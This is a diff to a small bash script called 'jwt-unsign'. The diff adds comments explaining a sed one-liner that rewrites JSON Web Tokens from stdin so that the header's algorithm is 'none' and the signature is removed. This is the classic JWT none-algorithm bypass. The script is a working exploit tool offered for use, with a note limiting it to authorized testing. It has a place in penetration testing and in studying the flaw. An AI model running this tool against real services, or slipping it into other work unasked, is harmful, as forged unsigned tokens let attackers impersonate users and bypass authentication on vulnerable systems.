@@ -1,7 +1,39 @@
 #!/bin/bash
+#
+# jwt-unsign - JWT None Algorithm Exploit Tool
+#
+# DESCRIPTION:
+#   This script searches for JSON Web Tokens (JWTs) in stdin and modifies them
+#   by replacing the algorithm (alg) value with "none" and removing the signature.
+#   This exploits a common JWT vulnerability where some implementations accept
+#   unsigned tokens when alg is set to "none".
+#
+# USAGE:
+#   echo "token: eyJhbGci..." | jwt-unsign
+#   cat file.txt | jwt-unsign
+#   curl https://example.com | jwt-unsign
+#
+# SECURITY NOTE:
+#   This tool is intended for authorized security testing only. Use responsibly
+#   and only on systems you have permission to test.
+#
+# HOW IT WORKS:
+#   - Matches JWT header: eyJhbGciOiJ[...]iIsInR5cCI6IkpXVCJ9
+#     (Base64: {"alg":"<any>","typ":"JWT"})
+#   - Captures the payload (second part of JWT)
+#   - Removes the signature (third part)
+#   - Replaces header with: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+#     (Base64: {"alg":"none","typ":"JWT"})
+#   - Outputs modified JWT with trailing period
 
 set -euo pipefail
 IFS=$'\n\t'
 
-# Replace alg value with none and remove signature
+# Regex breakdown:
+# - eyJhbGciOiJ[a-zA-Z0-9_\-]\+iIsInR5cCI6IkpXVCJ9 : Matches JWT header with any algorithm
+# - \.\(e[a-zA-Z0-9_\-]\+\) : Captures the payload (starts with 'e' when base64 encoded)
+# - \.[a-zA-Z0-9_\-]* : Matches and discards the signature
+# Replacement:
+# - eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0 : New header with alg="none"
+# - .\1. : Payload with trailing period (invalid signature placeholder)
 /bin/sed -e 's/eyJhbGciOiJ[a-zA-Z0-9_\-]\+iIsInR5cCI6IkpXVCJ9\.\(e[a-zA-Z0-9_\-]\+\)\.[a-zA-Z0-9_\-]*/eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.\1./g'
